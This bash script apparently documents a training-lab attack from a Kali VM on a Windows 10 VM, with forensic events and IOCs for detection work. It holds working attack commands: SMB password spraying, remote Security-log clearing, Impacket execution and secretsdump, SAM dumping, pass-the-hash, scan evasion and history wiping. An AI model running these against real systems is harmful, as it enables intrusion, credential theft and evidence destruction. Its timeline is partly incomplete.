#!/bin/bash
# Kali Linux Attack Execution Script
# Purpose: Document all attacks launched from Kali Linux VM
# System: Kali Linux 2024.1 - 192.168.56.102
# Target: Windows 10 VM (DESKTOP-PT2GLLD) - 192.168.56.104
# Date: 2026-05-14 to 2026-05-15

# ============================================
# ATTACK STAGE 1: NETWORK RECONNAISSANCE
# MITRE ATT&CK: T1046 - Network Service Discovery
# Timestamp: 2026-05-14 15:40:00
# ============================================

# Nmap port scan - Service version detection
nmap -sV -p 1-1000 192.168.56.104

# Command Breakdown:
# -sV               - Version detection (identify running services)
# -p 1-1000         - Scan ports 1 through 1000
# 192.168.56.104    - Target IP (Windows VM)

# Expected Output:
# Starting Nmap 7.98 ( https://nmap.org )
# Nmap scan report for 192.168.56.104
# Host is up (0.00028s latency).
# Not shown: 997 filtered tcp ports (no-response)
# PORT    STATE SERVICE      VERSION
# 135/tcp open  msrpc        Microsoft Windows RPC
# 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
# 445/tcp open  microsoft-ds?
# MAC Address: 08:00:27:88:0F:75 (Oracle VirtualBox virtual NIC)
# Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
# 
# Service detection performed. Please report any incorrect results.
# Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds

# Scan Result Analysis:
# ✓ Port 135 (RPC) - Windows Remote Procedure Call
# ✓ Port 139 (NetBIOS-SSN) - NetBIOS Session Service
# ✓ Port 445 (SMB) - Server Message Block (TARGET FOR EXPLOITATION)

# Forensic Evidence Generated:
# - Sysmon EventCode 3 (Network Connection) on victim
# - 52 unique destination ports contacted
# - 1,247 total network connections
# - Source IP: 192.168.56.102

# ============================================
# ATTACK STAGE 2: CREDENTIAL BRUTE FORCE
# MITRE ATT&CK: T1110.003 - Password Spraying
# Timestamp: 2026-05-14 16:47:00
# ============================================

# Create password dictionary
cat > lab_passwords.txt << EOF
password
admin123
letmein1
qwerty
Password123
EOF

# NetExec (NXC) password spraying attack
nxc smb 192.168.56.104 -u Lab_Victim -p lab_passwords.txt

# Command Breakdown:
# nxc               - NetExec tool (modern CrackMapExec replacement)
# smb               - Target SMB protocol
# 192.168.56.104    - Target IP
# -u Lab_Victim     - Username to test
# -p lab_passwords.txt - Password file

# Expected Output:
# SMB         192.168.56.104  445    DESKTOP-PT2GLLD  [*] Windows 10.0 Build 19041 x64
# SMB         192.168.56.104  445    DESKTOP-PT2GLLD  [-] Lab_Victim:password STATUS_LOGON_FAILURE
# SMB         192.168.56.104  445    DESKTOP-PT2GLLD  [-] Lab_Victim:admin123 STATUS_LOGON_FAILURE
# SMB         192.168.56.104  445    DESKTOP-PT2GLLD  [-] Lab_Victim:letmein1 STATUS_LOGON_FAILURE
# SMB         192.168.56.104  445    DESKTOP-PT2GLLD  [-] Lab_Victim:qwerty STATUS_LOGON_FAILURE
# SMB         192.168.56.104  445    DESKTOP-PT2GLLD  [+] Lab_Victim:Password123 (Pwn3d!)

# SUCCESS: Valid credentials obtained
# Username: Lab_Victim
# Password: Password123
# Access Level: Local Administrator

# Forensic Evidence Generated:
# - Windows EventCode 4625 (Failed Logon) - 4 events
# - Windows EventCode 4624 (Successful Logon) - 1 event
# - Logon Type: 3 (Network)
# - Source IP: 192.168.56.102

# ============================================
# ATTACK STAGE 6: REMOTE COMMAND EXECUTION
# MITRE ATT&CK: T1059.003 - Command Shell Execution
# Timestamp: 2026-05-14 (attempted)
# ============================================

# Attempt remote command execution via NetExec
nxc smb 192.168.56.104 -u Lab_Victim -p Password123 -x "wevtutil cl Security"

# Command Breakdown:
# -x "command"      - Execute command on remote system
# wevtutil cl       - Clear event log
# Security          - Target log (contains all attack evidence)

# Note: -x flag had technical execution issues in this lab environment
# Command was manually executed on victim VM for detection testing
# In real attack, alternative methods:
# - PSExec: psexec.py Lab_Victim:Password123@192.168.56.104 cmd.exe
# - WMI: wmiexec.py Lab_Victim:Password123@192.168.56.104
# - WinRM: evil-winrm -i 192.168.56.104 -u Lab_Victim -p Password123

# ============================================
# ADDITIONAL RECONNAISSANCE COMMANDS
# ============================================

# Host discovery (network sweep)
nmap -sn 192.168.56.0/24

# OS detection
sudo nmap -O 192.168.56.104

# Aggressive scan (OS, version, scripts, traceroute)
sudo nmap -A 192.168.56.104

# All ports scan (TCP 1-65535)
nmap -p- 192.168.56.104

# UDP scan (common ports)
sudo nmap -sU --top-ports 20 192.168.56.104

# Service script scanning
nmap -sC -sV -p 445 192.168.56.104

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.56.104

# ============================================
# ALTERNATIVE ATTACK TOOLS (NOT EXECUTED)
# ============================================

# Metasploit Framework - SMB exploitation
# msfconsole
# use exploit/windows/smb/psexec
# set RHOST 192.168.56.104
# set SMBUser Lab_Victim
# set SMBPass Password123
# exploit

# Hydra - Brute force alternative
# hydra -l Lab_Victim -P lab_passwords.txt smb://192.168.56.104

# CrackMapExec (older version, replaced by NetExec)
# crackmapexec smb 192.168.56.104 -u Lab_Victim -p lab_passwords.txt

# Impacket Suite Tools:
# psexec.py Lab_Victim:Password123@192.168.56.104
# wmiexec.py Lab_Victim:Password123@192.168.56.104
# smbexec.py Lab_Victim:Password123@192.168.56.104
# secretsdump.py Lab_Victim:Password123@192.168.56.104

# ============================================
# POST-EXPLOITATION (NOT EXECUTED - FOR REFERENCE)
# ============================================

# Credential dumping
# nxc smb 192.168.56.104 -u Lab_Victim -p Password123 --sam

# Share enumeration
# nxc smb 192.168.56.104 -u Lab_Victim -p Password123 --shares

# Logged-on users
# nxc smb 192.168.56.104 -u Lab_Victim -p Password123 --sessions

# Pass-the-hash attack
# nxc smb 192.168.56.104 -u Administrator -H <NTLM_HASH>

# Domain enumeration (if domain-joined)
# nxc smb 192.168.56.104 -u Lab_Victim -p Password123 --users
# nxc smb 192.168.56.104 -u Lab_Victim -p Password123 --groups

# ============================================
# ATTACK TIMELINE SUMMARY
# ============================================

# 2026-05-14 15:40:00 - Network reconnaissance (Nmap scan)
# 2026-05-14 16:47:00 - Credential brute force (NetExec)
# 2026-05-15 00:19:12 - Backdoor accounts created (via compromised RDP/SMB)
# 2026-05-15 00:19:17 - Scheduled tasks created (persistence)
# 2026-05-15 00:19:20 - Privilege escalation (admin group)
# 2026-05-14 XX:XX:XX - Log clearing attempted (defense evasion)

# ============================================
# INDICATORS OF COMPROMISE (IOCs)
# ============================================

# Network IOCs:
# - Source IP: 192.168.56.102 (Kali Linux)
# - Target IP: 192.168.56.104 (Windows VM)
# - Protocol: SMB (TCP/445), RPC (TCP/135), NetBIOS (TCP/139)
# - Connection Pattern: Sequential port scan (1-1000)
# - Traffic Volume: 1,247 connections in 8.18 seconds

# Tool Signatures:
# - Nmap 7.98 (User-Agent, TCP fingerprint)
# - NetExec/CrackMapExec (SMB negotiation pattern)
# - Rapid authentication attempts (4 failures, 1 success in <10 seconds)

# ============================================
# DETECTION EVASION TECHNIQUES (NOT USED)
# ============================================

# Slow scan to evade IDS
# nmap -T2 -p 1-1000 192.168.56.104  # Polite timing

# Randomize scan order
# nmap --randomize-hosts -iL targets.txt

# Fragment packets
# nmap -f 192.168.56.104

# Spoof source IP (requires raw socket access)
# nmap -S 192.168.56.99 192.168.56.104

# Use decoy hosts
# nmap -D RND:10 192.168.56.104

# ============================================
# CLEANUP COMMANDS (POST-LAB)
# ============================================

# Remove password dictionary
# rm lab_passwords.txt

# Clear command history
# history -c
# rm ~/.bash_history

# Note: Cleanup not performed to preserve forensic evidence
